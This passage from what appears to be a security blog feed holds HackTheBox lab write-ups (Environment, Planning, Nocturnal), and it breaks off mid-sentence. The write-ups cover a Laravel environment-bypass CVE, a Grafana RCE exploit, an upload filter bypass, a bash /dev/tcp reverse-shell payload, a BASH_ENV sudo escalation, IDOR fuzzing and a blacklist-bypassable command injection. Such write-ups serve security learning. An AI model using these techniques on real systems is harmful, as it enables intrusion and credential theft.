class="hljs-string">&#x27;red&#x27;</span>;&#125;</code></pre></div><p>This code is related to the email join function. It simply does the following</p><ol><li>grab the <code>email &amp; _token</code> parameter values and assign it to <code>email</code>, <code>csrfToken</code> variables</li><li>send a POST req to <code>/mailing</code> endpoint with <code>email</code>, <code>_token</code> parameters in the body with the values of the variables that were assigned before</li><li>The response comes in a JSON format. If it successful, prints a success message and if it’s not, you get an error</li></ol><p>The most important thing here is the <code>/mailing</code> endpoint. I request it to see what it has and i got surprised with this error:</p><p><img src="/images/htb-m/environment/Pasted%20image%2020250724162705.png"></p><p>The application is running <code>Laravel</code> at the backend (an open-source PHP-based web framework for building web applications) And we got a little nice debugger left opened here, that we can use to see a detailed info about errors that also leaks some of the source code.<br>Even with that info we got from the debugger. i’m at a dead end now, the page has nothing.  </p><p>When you face these types of situations, then you should know it’s <strong>fuzzing time</strong>. Surely the application has something right? Or there will be no point of making this machine. So you keep knocking on the site until something is hopefully opened.  </p><p>I used <code>ffuf</code> for this mission with a <code>common.txt</code> wordlist: <a href="https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/common.txt">danielmiessler&#x2F;SecLists</a>.<br>I got some results.</p><p><img src="/images/htb-m/environment/Pasted%20image%2020250724163958.png"></p><h1 id="II-Analyze"><a href="#II-Analyze" class="headerlink" title="II Analyze"></a>II Analyze</h1><p>The most important endpoint here is the <code>/login</code> endpoint. The rest was either forbidden or empty.<br>By navigating to the <code>/login</code> endpoint, we see a simple login page (strange, isn’t it? xD) </p><p><img src="/images/htb-m/environment/Pasted%20image%2020250724164255.png"></p><p>My only focus here is to somehow raise an error to see what the debugger will tell us. I made a login request with remember me option on, intercepted it with burp and tried to play with it a little bit.  </p><p>I tried a simple trick by adding <code>[]</code> after the parameter, PHP will convert the data type to be an array that way, which may cause an error since there server doesn’t expect an array to be here.</p><p><img src="/images/htb-m/environment/Pasted%20image%2020250724165028.png"></p><p>As you can see we have a 500 internal server error here. right click on the request, choose show response in browser and paste the link in the browser.</p><p><img src="/images/htb-m/environment/Screenshot%202025-07-24%20165414.png"></p><p>We raised an error about <code>$keep_loogedin</code> being undefined (probably cause what i did). That part doesn’t really matter, cause it’s related to the <code>remember</code> parameter being True or False.  </p><p>If it’s true you will be logged in without adding your creds again, if it’s not you will add the creds in order to login. The thing is, we don’t even have any creds that we can use, that’s why this part not matter.  </p><p>In the other hand, the second part <code>if(App::environment() == &quot;preprod&quot;)</code> is huge information. The <code>QOL</code> (mentioned in the comment) it’s like a feature intended for development or testing modes that you can use to bypass the login process and get admin privilege (as mentioned in <code>(&#39;user_id&#39;, 1)</code> part) without authentication.  </p><p>I did a little bit of research, to see how i can bypass the login page with the help of the laravel version being disclosed at the top right. I found some CVEs related to that version, most importantly is <strong>CVE-2024-52301</strong>: <a href="https://muneebdev.com/laravel-11-30-0-exploit/">Laravel 11.30.0 Exploit: Critical Vulnerabilities &amp; Protection</a>.  </p><p>The vulnerability happened when the <code>register_argc_argv</code> PHP directive left opened, that will lead the attackers to craft malicious query strings (parameter) that manipulate the application’s environment.  </p><p>I also found a POC for this: <a href="https://github.com/Nyamort/CVE-2024-52301">Nyamort&#x2F;CVE-2024-52301</a>. The only thing you need to do is the add <code>--env</code> parameter with the environment mode mentioned at the error debugger (preprod)<br>The request will be like this:</p><p><img src="/images/htb-m/environment/Screenshot%202025-07-24%20171546.png"></p><p>Once you logged in, you will see an upload function. We may get a web shell from it?</p><p><img src="/images/htb-m/environment/Pasted%20image%2020250724171840.png"></p><p>I did upload a simple image, intercept the request with burp and tried testing for file upload attacks.</p><p><img src="/images/htb-m/environment/Pasted%20image%2020250724172804.png"></p><h1 id="III-Exploit-webshell"><a href="#III-Exploit-webshell" class="headerlink" title="III Exploit (webshell)"></a>III Exploit (webshell)</h1><p>First i tried multiple extensions but it gave me <code>Invalid file detected</code> error. Then i fuzzed on extensions with this wordlist: <a href="https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt">Web Extensions</a> and found some that were accepted by the server (php7, phtml, …..etc) but all of them didn’t execute the shell command.  </p><p>While testing i figured out that when you add <code>.</code> at the end of the extension, it gets deleted by the server (e.g. <code>test.png.</code> &#x3D;&gt; <code>test.png</code>). And thats how you can bypass the filter by adding <code>.</code> at the end of the file (<code>shell.php.</code>)</p><p><img src="/images/htb-m/environment/Pasted%20image%2020250724173949.png" alt="I left the image header cause the filter checks on the MimeType"></p><p>By going to the upload URL, adding the <code>cmd</code> parameter with value of <code>id</code> to see if our webshell is working</p><p><img src="/images/htb-m/environment/Pasted%20image%2020250724174336.png"></p><h1 id="IV-Reverse-Shell"><a href="#IV-Reverse-Shell" class="headerlink" title="IV Reverse Shell"></a>IV Reverse Shell</h1><p>Now let’s turn it into a reverse one. You can get a reverse shell from a web shell by simply adding this payload in the <code>cmd</code> parameter: <code>bash -c &#39;bash -i &gt;&amp; /dev/tcp/&lt;IP&gt;/&lt;port&gt; 0&gt;&amp;1&#39;</code>. But you need first to establish a listener on the port that you will get a reverse shell on. By doing that you will successfully get a reverse shell:</p><p><img src="/images/htb-m/environment/Pasted%20image%2020250724175125.png" alt="User Flag"></p><h1 id="V-Root"><a href="#V-Root" class="headerlink" title="V Root"></a>V Root</h1><p>As you can see, we have a backup file, i opened it and found <code>keyvault.gpg</code> file in it. From this file’s extension, this file is encrypted using GnuPG (GPG), a tool commonly used to encrypt and sign data. </p><p>I tried to decrypt the file with <code>--decrypt</code> flag</p><p><img src="/images/htb-m/environment/Pasted%20image%2020250724191408.png"></p><p>As you can see the tool reading the keys from <code>/var/www/.gnupg</code> directory, which we don’t have access to it.</p><p>I kept searching and found out that when using GnuPG(GPG), you probably have a directory called <code>/.gnupg</code> That contains private&#x2F;public keys for encryption and decryption<br>&#x3D;&gt; <a href="https://www.redhat.com/en/blog/getting-started-gpg">Getting started with GPG (GnuPG)</a>.<br>&#x3D;&gt; <a href="https://medium.com/@acparas/gpg-quickstart-guide-d01f005ca99">GPG Quickstart Guide 🔒. I recently discovered GPG and how… | by Anton Paras | Medium</a>.</p><p>i found that directory (<code>/.gnupg</code>) in <code>/hish</code> directory. By navigating to it i found the following:</p><p><img src="/images/htb-m/environment/Pasted%20image%2020250724191623.png"></p><p>There is a <code>/private-keys-v1.d</code> directory that is probably have the keys. We can use the <code>--homedir</code> flag to tell the tool to get <code>/.gnupg</code> from <code>/hish</code> directory instead of <code>/var/www</code>.  </p><p>I tried to decrypt the file that way and guess what happened, another error:</p><p><img src="/images/htb-m/environment/Pasted%20image%2020250724192233.png"></p><p>We also don’t have write permission in <code>/hish</code> directory. To make the tool work properly, we need a place that we have write access to it. The best place came to my mind is <code>/tmp</code>  directory, where users has write access to it.  </p><ol><li><p>First you need to make a dir in <strong>&#x2F;tmp</strong>: <code>mkdir test</code>.</p></li><li><p>Copy the <code>.gnupg</code> from the <code>/hish</code> directory to the dir you created in <code>/tmp</code> directory.<br>Or you can just create and copy at the same time without needing to first point:<br><code>cp -r /home/hish/.gnupg /tmp/test</code></p></li><li><p>give it the right access: <code>chmod 755 test</code>.</p></li><li><p>lists the secret keys in the directory by using <code>--list-secret-keys</code> flag:<br><code>gpg --homedir test --list-secret-keys</code>. (you need to be at <code>/tmp</code> here)</p></li><li><p>decrypt the required file and use the <code>--output</code> flag to place the results in a file:<br><code>gpg --homedir test --output best.txt --decrypt /home/hish/backup/keyvault.gpg</code>.</p></li></ol><p><img src="/images/htb-m/environment/Pasted%20image%2020250724200243.png"></p><p>Now we got our password that we can use to access the server as <strong>hish</strong> <code>ssh hish@10.10.11.67</code>.</p><p><img src="/images/htb-m/environment/Pasted%20image%2020250724200512.png"></p><p>Usually we don’t have access to the <code>/root</code> directory, we need to escalate our privilege.<br>By executing this command: <code>sudo -l</code> to see if we have access on sudo command and what other commands that we have access to it.</p><p><img src="/images/htb-m/environment/Pasted%20image%2020250724200806.png"></p><p>From this results, we have access on <code>systeminfo</code> script. and also the sudo confing keeps certain <strong>environment variables</strong> (<code>ENV</code>, <code>BASH_ENV</code>) to be accessed and used.  </p><p>The <code>BASH_ENV</code> is a life change in this exploit. from this we can create a malicious file that contains some bash code that will get us root privileges. And then we can source that file, by exporting it’s path to the <code>BASH_ENV</code> environment variable then run <code>systeminfo</code> script.  </p><p>The exploit will be the following:</p><ol><li><p>create a file: <code>echo -e &#39;#!/bin/bash\n/bin/bash -p&#39; &gt; test</code>.</p></li><li><p>give it execute permission: <code>chmod +x test</code>.</p></li><li><p>export the file path into <code>BASH_ENV</code> environment variable: <code>export BASH_ENV=test</code>. and that will do the following:<br><em>Tells bash to source our malicious file so that any new non-interactive shell is launched, our file gets executed first.</em></p></li><li><p>run the <code>systeminfo</code> script as sudo: <code>sudo /usr/bin/systeminfo</code>. And because <code>systeminfo</code> runs as a script, it’s is considered a <strong>non-interactive Bash shell</strong>. So bash will source the file set in <code>BASH_ENV</code> (our malicious file) before executing the script. That will likely prevent the <code>systeminfo</code> script from fully executing.</p></li></ol><p><img src="/images/htb-m/environment/Screenshot%202025-07-24%20204038.png" alt="Root Flag"></p>]]></content>
    
    
    <categories>
      
      <category>HTB</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>htb</tag>
      
      <tag>linux</tag>
      
      <tag>machines</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTB Planning Machine (Easy)</title>
    <link href="/2025/08/31/htb-m/planning/"/>
    <url>/2025/08/31/htb-m/planning/</url>
    
    <content type="html"><![CDATA[<p><img src="/images/htb-m/planning/1.png"></p><p>I’m gonna walk through how I solved the <strong>Planning</strong> machine. It’s a Linux machine, a <strong>Easy</strong> one on HackTheBox.</p><h1 id="I-Reconnaissance"><a href="#I-Reconnaissance" class="headerlink" title="I Reconnaissance"></a>I Reconnaissance</h1><p>First i start with simple Nmap scan:<br><img src="/images/htb-m/planning/Pasted%20image%2020250721141426.png"></p><p>An http&#x2F;SSH servers are opened. Second i start looking on the. The provided domain is an education site that has about 5 pages:</p><ol><li>about.php</li><li>detail.php</li><li>contact.php</li><li>course.php</li><li>enroll.php</li></ol><p>After investigating some time on the app, i found nothing useful, this site was completely empty.  </p><p>Then i decided to look for vhosts related to that IP. Used <code>ffuf</code> for this with this wordlist: <a href="https://github.com/danielmiessler/SecLists/blob/master/Discovery/DNS/subdomains-spanish.txt">subdomains-spanish.txt</a>. And i found a hit:</p><p><img src="/images/htb-m/planning/Pasted%20image%2020250721134449.png"></p><p>By adding the vhost in <code>/etc/hosts</code> file we can access it now. The site was a grafana site (an open-source platform for data visualization and monitoring). Now we can add our creds we got from the machine to login</p><p><img src="/images/htb-m/planning/Pasted%20image%2020250721135012.png"></p><h1 id="II-Analyze"><a href="#II-Analyze" class="headerlink" title="II Analyze"></a>II Analyze</h1><p>Okay we logged in, now what? The first thing came to my mind is to find the grafana version to start looking for vulns related to that version that may help us getting a reverse shell.  But, how gonna know the version??<br>After some time searching in the html code, i found it: <code>Grafana v11.0.0</code> (you can see it at the bottom of the front page too):</p><p><img src="/images/htb-m/planning/Pasted%20image%2020250721135456.png"></p><p>Now i start searching for vulns related to that version. This version is affected to <strong>CVE-2024-9264</strong> (The vulnerability was in an experimental feature named SQL Expressions that allows for data source query output to be post-processed by executing one or more SQL queries. These SQL queries were <em>not</em> sanitized completely, leading to a command injection and local file inclusion vulnerability): <a href="https://grafana.com/blog/2024/10/17/grafana-security-release-critical-severity-fix-for-cve-2024-9264/">Grafana security release: Critical severity fix for CVE-2024-9264 | Grafana Labs</a>.</p><p>Now we know the CVE, we need a POC for that. I found a github repo that provides a POC to this CVE: <a href="https://github.com/z3k0sec/CVE-2024-9264-RCE-Exploit">z3k0sec&#x2F;CVE-2024-9264-RCE-Exploit: Grafana RCE exploit (CVE-2024-9264)</a>. </p><h1 id="III-Exploit"><a href="#III-Exploit" class="headerlink" title="III Exploit"></a>III Exploit</h1><p>By executing the script and establishing a listener on port 9001:</p><p><img src="/images/htb-m/planning/Pasted%20image%2020250721140911.png"></p><p><img src="/images/htb-m/planning/Pasted%20image%2020250721140950.png" alt="We got our reverse shell"></p><p>I didn’t find any flags so the goal here is we may need to find creds that we can use to login on the SSH server<br>By doing <code>ls -la</code> command:</p><p><img src="/images/htb-m/planning/Pasted%20image%2020250721141954.png"><br><img src="/images/htb-m/planning/Pasted%20image%2020250721160545.png"></p><p>That looks like a docker image, let’s read the environment variables to see if there anything interesting</p><p><img src="/images/htb-m/planning/Pasted%20image%2020250721142758.png"><br>We can see that we got a username and password, so let’s login on the SSH server by this command:<br><code>ssh enzo@10.10.11.68</code> and then provide the password that we got before.</p><p><img src="/images/htb-m/planning/Pasted%20image%2020250721142850.png" alt="User Flag"></p><p>Now it’s time for privilege escalation, in order to get <strong>root.txt</strong>.  </p><h1 id="IV-Root"><a href="#IV-Root" class="headerlink" title="IV Root"></a>IV Root</h1><p>I start with <code>sudo -l</code>, then i noticed that the user has no control on sudo command. Then i tried to run <code>linpeas.sh</code> tool, but i need first to upload the tool on the server. I fired up my internal server <code>python3 -m http.server 8080</code>, then i downloaded the tool from my server to the SSH server:<br><img src="/images/htb-m/planning/Pasted%20image%2020250721143944.png"></p><p>i gave the tool the execute permission by this command: <code>chmod +x linpeas.sh</code>. Then i ran the tool. While analyzing the results from the tool, i found a weird thing:</p><p><img src="/images/htb-m/planning/Pasted%20image%2020250721160815.png"></p><p>Port <strong>8000</strong> was opened, what is that port doing here? probably there is another webserver on it that running a site?<br>To navigate to that port on the localhost, we need to establish an SSH tunnel so that any traffic from my localhost will be tunneled through a remote server (<code>planning.htb</code>).</p><p>We can do that by this command: <code>ssh -L 8000:localhost:8000 enzo@planning.htb</code>. Now by navigating to our localhost url on port 8000, we see this:</p><p><img src="/images/htb-m/planning/Pasted%20image%2020250721161633.png"></p><p>A simple basic authentication mechanism exist in place, i tried some ways to bypass it but with no luck. Now what? going back to the <code>linpeas.sh</code> results to see if we missed any creds that may help us in this basic auth. After some digging i found database files that may contain sensitive data</p><p><img src="/images/htb-m/planning/Screenshot%202025-07-21%20162741.png"></p><p>By navigating to that <code>crontab.db</code> file and read it, i found some creds that can help us:</p><p><img src="/images/htb-m/planning/Screenshot%202025-07-21%20163355.png"></p><p>After using the creds, we successfully logged in:</p><p><img src="/images/htb-m/planning/Pasted%20image%2020250721163737.png"></p><p>We see a crontab UI page (crontab is a configuration file used to schedule tasks or scripts to run automatically at specified times or intervals). So we can run commands here, probably another reverse shell?<br>By making a new job with a reverse shell payload and save it.</p><p><img src="/images/htb-m/planning/Pasted%20image%2020250721164109.png"></p><p>Before you run the command, you need to establish a listener first, in our case is <code>nc -lvnp 4444</code>. Then run the script</p><p><img src="/images/htb-m/planning/Pasted%20image%2020250721164315.png"></p><p>Noticed we got a second shell and successfully got the second flag</p><p><img src="/images/htb-m/planning/Pasted%20image%2020250721164452.png" alt="Root Flag"></p>]]></content>
    
    
    <categories>
      
      <category>HTB</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>htb</tag>
      
      <tag>linux</tag>
      
      <tag>machines</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTB Nocturnal Machine (Easy)</title>
    <link href="/2025/08/24/htb-m/nocturnal/"/>
    <url>/2025/08/24/htb-m/nocturnal/</url>
    
    <content type="html"><![CDATA[<p><img src="/images/htb-m/nocturnal/Pasted%20image%2020250724155806.png"></p><p>Here I’m gonna walk through how I solved the <strong>Nocturnal</strong> machine. It’s a Linux machine, an <em>easy</em> one from HackTheBox.</p><h1 id="I-Reconnaissance"><a href="#I-Reconnaissance" class="headerlink" title="I Reconnaissance"></a>I Reconnaissance</h1><p>First i started with a simple Nmap scan and found the following:</p><p><img src="/images/htb-m/nocturnal/Pasted%20image%2020250723154047.png"></p><p>As you can see there is an SSH server and web server running on port 80. By pasting the IP into the browser, you will get a domain called <code>nocturnal.htb</code>. Add the domain in the <code>/etc/hosts</code> file with the intended IP and you will get a vision on how the site looks:</p><p><img src="/images/htb-m/nocturnal/Pasted%20image%2020250723145604.png"></p><h1 id="II-Analyze"><a href="#II-Analyze" class="headerlink" title="II Analyze"></a>II Analyze</h1><p>It’s a simple PHP application with a <code>login/register</code> function. Going to the register function at <code>/register.php</code> to create an account, then logging in at <code>/login.php</code> with the creds we just made.</p><p><img src="/images/htb-m/nocturnal/Pasted%20image%2020250723145857.png"></p><p>After a successful login, we can see a simple upload function. By uploading any file you will get this error:</p><p><img src="/images/htb-m/nocturnal/Pasted%20image%2020250723150240.png"></p><p>I actually tried to bypass  that with double extensions and other stuff but with no luck, it seems robust. I intercepted the request through burp, changed the extension to <code>.pdf</code> and uploaded the file successfully. Now we can see our file exist here:</p><p><img src="/images/htb-m/nocturnal/Pasted%20image%2020250723150657.png"></p><p>By pressing at the link, the file gets downloaded automatically. After that i went to burp and saw this request:</p><p><img src="/images/htb-m/nocturnal/Pasted%20image%2020250723150837.png"></p><p>You actually could see it on the browser too:</p><p><img src="/images/htb-m/nocturnal/Pasted%20image%2020250723151003.png"></p><p>We see some interesting stuff here:</p><ol><li><code>username</code> parameter: maybe we can change it to another username and get accessed to unauthorized files we shouldn’t see. Leading to <strong>IDOR</strong> vulnerability.</li><li><code>file</code> parameter: We may try path traversal here, trying to read system files like <code>/etc/passwd</code> leading to <strong>LFI</strong> vulnerability.</li></ol><p>First i tested the <code>username</code> parameter. I created a new account with username “<strong>best</strong>“, uploaded some files. Then i sent the request above (from the “test” account) and changed the username from “test” (account 1) to “best” (account 2)</p><p><img src="/images/htb-m/nocturnal/Pasted%20image%2020250723152117.png"></p><p>The request was successful (Noticed, you need to add a valid extension in the <code>file</code> parameter. Otherwise you will get an error), revealing files from another user. We successfully got an <strong>IDOR</strong> vulnerability. </p><p>Now it’s time for fuzzing on that username parameter to see if there any other valid names that we can see their files too.<br>(<em>First I tried to test the <code>file</code> parameter, but you need to add a valid extension from the extensions mentioned above, making it worthless to test</em>)</p><p>I used ffuf here to fuzz on usernames with my wordlist using this command:<br><code>ffuf -w usernames.txt -u http://nocturnal.htb/view.php?username=FUZZ&amp;file=.pdf -H &quot;Cookie: PHPSESSID=&lt;YOUR-SESSIOn&gt;&quot; -fs 2985</code><br><em>While testing on the <code>username</code> parameter, i found that when you add an invalid name you got a response <strong>length: 2985</strong>. So we need to filter that out with the <code>-fs 2985</code> flag</em>.</p><p><img src="/images/htb-m/nocturnal/Pasted%20image%2020250723153359.png"></p><p>And we got some hits. <code>admin</code> and <code>tobias</code> has no files, but <code>amanda</code> dose.</p><p><img src="/images/htb-m/nocturnal/Pasted%20image%2020250723153635.png"></p><p>By downloading the file and read it using LibreOffice (or you can just use <code>cat</code> command), you will find a password.</p><p><img src="/images/htb-m/nocturnal/Pasted%20image%2020250723153825.png"></p><p>I thought i can use that password on the SSH server, but i was wrong. So it has to be a password that i can use to login as <code>amanda</code> on the site. Going back to the login page, logging in with <code>amanda</code> creds. We successfully logged in and we have admin privileges too!</p><p><img src="/images/htb-m/nocturnal/Pasted%20image%2020250723154342.png"></p><p>By navigating to the admin panel, found the following:</p><p><img src="/images/htb-m/nocturnal/Pasted%20image%2020250723154554.png"></p><p>We got some PHP files that we can include and view it’s source code. I Choose the admin page and i saw a <code>view</code> parameter showed up</p><p><img src="/images/htb-m/nocturnal/Pasted%20image%2020250723154954.png"></p><p>Tried to test that parameter against <code>LFI</code>, but no luck. I copied all the code, paste it in vscode cause it’s easy to read and found some interesting things:</p><div class="code-wrapper"><pre><code class="hljs PHP"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">sanitizeFilePath</span>(<span class="hljs-params"><span class="hljs-variable">$filePath</span></span>) </span>&#123;    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$filePath</span>); <span class="hljs-comment">// Only gets the base name of the file</span>&#125;</code></pre></div><p>First of all the <code>sanitizeFilePath()</code> function. It’s using the <code>basename()</code> function on the file path to extract only the filename from a given path (<code>../../test.php</code> becomes <code>test.php</code>) preventing path traversal from happening (and i am asking why i can’t get path traversal xD). Most importantly, is the backup process:</p><div class="code-wrapper"><pre><code class="hljs PHP"><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;backup&#x27;</span>]) &amp;&amp; !<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>])) &#123;    <span class="hljs-variable">$password</span> = <span class="hljs-title function_ invoke__">cleanEntry</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>]);    <span class="hljs-variable">$backupFile</span> = <span class="hljs-string">&quot;backups/backup_&quot;</span> . <span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&#x27;Y-m-d&#x27;</span>) . <span class="hljs-string">&quot;.zip&quot;</span>;    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$password</span> === <span class="hljs-literal">false</span>) &#123;        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;div class=&#x27;error-message&#x27;&gt;Error: Try another password.&lt;/div&gt;&quot;</span>;    &#125; <span class="hljs-keyword">else</span> &#123;        <span class="hljs-variable">$logFile</span> = <span class="hljs-string">&#x27;/tmp/backup_&#x27;</span> . <span class="hljs-title function_ invoke__">uniqid</span>() . <span class="hljs-string">&#x27;.log&#x27;</span>;               <span class="hljs-variable">$command</span> = <span class="hljs-string">&quot;zip -x &#x27;./backups/*&#x27; -r -P &quot;</span> . <span class="hljs-variable">$password</span> . <span class="hljs-string">&quot; &quot;</span> . <span class="hljs-variable">$backupFile</span> . <span class="hljs-string">&quot; .  &gt; &quot;</span> . <span class="hljs-variable">$logFile</span> . <span class="hljs-string">&quot; 2&gt;&amp;1 &amp;&quot;</span>;                <span class="hljs-variable">$descriptor_spec</span> = [            <span class="hljs-number">0</span> =&gt; [<span class="hljs-string">&quot;pipe&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>], <span class="hljs-comment">// stdin</span>            <span class="hljs-number">1</span> =&gt; [<span class="hljs-string">&quot;file&quot;</span>, <span class="hljs-variable">$logFile</span>, <span class="hljs-string">&quot;w&quot;</span>], <span class="hljs-comment">// stdout</span>            <span class="hljs-number">2</span> =&gt; [<span class="hljs-string">&quot;file&quot;</span>, <span class="hljs-variable">$logFile</span>, <span class="hljs-string">&quot;w&quot;</span>], <span class="hljs-comment">// stderr</span>        ];        <span class="hljs-variable">$process</span> = <span class="hljs-title function_ invoke__">proc_open</span>(<span class="hljs-variable">$command</span>, <span class="hljs-variable">$descriptor_spec</span>, <span class="hljs-variable">$pipes</span>);        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_resource</span>(<span class="hljs-variable">$process</span>)) &#123;            <span class="hljs-title function_ invoke__">proc_close</span>(<span class="hljs-variable">$process</span>);        &#125;        <span class="hljs-title function_ invoke__">sleep</span>(<span class="hljs-number">2</span>);        <span class="hljs-variable">$logContents</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$logFile</span>);        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$logContents</span>, <span class="hljs-string">&#x27;zip error&#x27;</span>) === <span class="hljs-literal">false</span>) &#123;            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;div class=&#x27;backup-success&#x27;&gt;&quot;</span>;            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p&gt;Backup created successfully.&lt;/p&gt;&quot;</span>;            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;a href=&#x27;&quot;</span> . <span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$backupFile</span>) . <span class="hljs-string">&quot;&#x27; class=&#x27;download-button&#x27; download&gt;Download Backup&lt;/a&gt;&quot;</span>;            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h3&gt;Output:&lt;/h3&gt;&lt;pre&gt;&quot;</span> . <span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$logContents</span>) . <span class="hljs-string">&quot;&lt;/pre&gt;&quot;</span>;            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/div&gt;&quot;</span>;        &#125; <span class="hljs-keyword">else</span> &#123;            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;div class=&#x27;error-message&#x27;&gt;Error creating the backup.&lt;/div&gt;&quot;</span>;        &#125;        <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$logFile</span>);    &#125;&#125;</code></pre></div><ol><li><p>The backup creation is created through POST method. First it checks on if the <code>backup</code> parameter present and if the <code>password</code> parameter is not empty (so you create a backup with a password).</p></li><li><p>Then it checks&#x2F;Sanitize that password provided by the user using <code>cleanEntry()</code> function (we will get into that later). If it’s not Sanitized, you will get an error otherwise you are good to go.</p></li><li><p>It creates the backup file on <code>/backups</code> having that form: <code>backup_</code> following by the date(Y-m-d) and a zip extension (<code>backups/backup_2025-02-11.zip</code>).</p></li><li><p>A temporary log file gets created.</p></li><li><p>After that we have a zip command: </p><ul><li><code>zip -x &#39;./backups/*&#39;</code>: Excludes the backups directory from the archive.</li><li><code>-r</code>: Recursively includes all files in the current directory.</li><li><code>-P $password</code>: Sets the password for the ZIP file (gets it from the password parameter after Sanitization ).</li></ul></li><li><p>Then the command gets executed using <code>proc_open()</code> function, waits 2 sec and checks the logs to see if there any error happened through the command execution process.</p></li><li><p>The log file gets deleted.</p></li></ol><p>We actually have a potential command injection vulnerability here that we can use on the <strong>password</strong> parameter, but we need to bypass the <code>cleanEntry()</code> function first:</p><div class="code-wrapper"><pre><code class="hljs PHP"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">cleanEntry</span>(<span class="hljs-params"><span class="hljs-variable">$entry</span></span>) </span>&#123;    <span class="hljs-variable">$blacklist_chars</span> = [<span class="hljs-string">&#x27;;&#x27;</span>, <span class="hljs-string">&#x27;&amp;&#x27;</span>, <span class="hljs-string">&#x27;|&#x27;</span>, <span class="hljs-string">&#x27;$&#x27;</span>, <span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27;`&#x27;</span>, <span class="hljs-string">&#x27;&#123;&#x27;</span>, <span class="hljs-string">&#x27;&#125;&#x27;</span>, <span class="hljs-string">&#x27;&amp;&amp;&#x27;</span>];    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$blacklist_chars</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$char</span>) &#123;        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$entry</span>, <span class="hljs-variable">$char</span>) !== <span class="hljs-literal">false</span>) &#123;            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>; <span class="hljs-comment">// Malicious input detected</span>        &#125;    &#125;    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$entry</span>, ENT_QUOTES, <span class="hljs-string">&#x27;UTF-8&#x27;</span>);&#125;</code></pre></div><p>The <code>cleanEntry()</code> function using a blacklist to sanitize the password, that’s not really a smart move since blacklisting is less secure than whitelisting. They should use <code>escapeshellarg()</code> function or something to prevent command injection from happening. After some time analyzing the other PHP pages, i found this line of code in <code>register.php</code> page:</p><div class="code-wrapper"><pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">session_start</span>();<span class="hljs-variable">$db</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SQLite3</span>(<span class="hljs-string">&#x27;../nocturnal_database/nocturnal_database.db&#x27;</span>);<span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>] == <span class="hljs-string">&#x27;POST&#x27;</span>) &#123;    <span class="hljs-variable">$username</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>];    <span class="hljs-variable">$password</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>]);    <span class="hljs-variable">$stmt</span> = <span class="hljs-variable">$db</span>-&gt;<span class="hljs-title function_ invoke__">prepare</span>(<span class="hljs-string">&quot;INSERT INTO users (username, password) VALUES (:username, :password)&quot;</span>);    <span class="hljs-variable">$stmt</span>-&gt;<span class="hljs-title function_ invoke__">bindValue</span>(<span class="hljs-string">&#x27;:username&#x27;</span>, <span class="hljs-variable">$username</span>, SQLITE3_TEXT);    <span class="hljs-variable">$stmt</span>-&gt;<span class="hljs-title function_ invoke__">bindValue</span>(<span class="hljs-string">&#x27;:password&#x27;</span>, <span class="hljs-variable">$password</span>, SQLITE3_TEXT);    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$stmt</span>-&gt;<span class="hljs-title function_ invoke__">execute</span>()) &#123;        <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;success&#x27;</span>] = <span class="hljs-string">&#x27;User registered successfully!&#x27;</span>;        <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Location: login.php&#x27;</span>);        <span class="hljs-keyword">exit</span>();    &#125; <span class="hljs-keyword">else</span> &#123;        <span class="hljs-variable">$error</span> = <span class="hljs-string">&#x27;Failed to register user.&#x27;</span>;    &#125;&#125;<span class="hljs-meta">?&gt;</span></code></pre></div><p>The server using SQLite3 as a DBMS and there is this little tiny file <code>nocturnal_database.db</code> that contains creds that we may use to access the SSH server. Also passwords gets MD5 hash which maybe crackable.</p><p>So the goal here to use the command injection vulnerability to read the 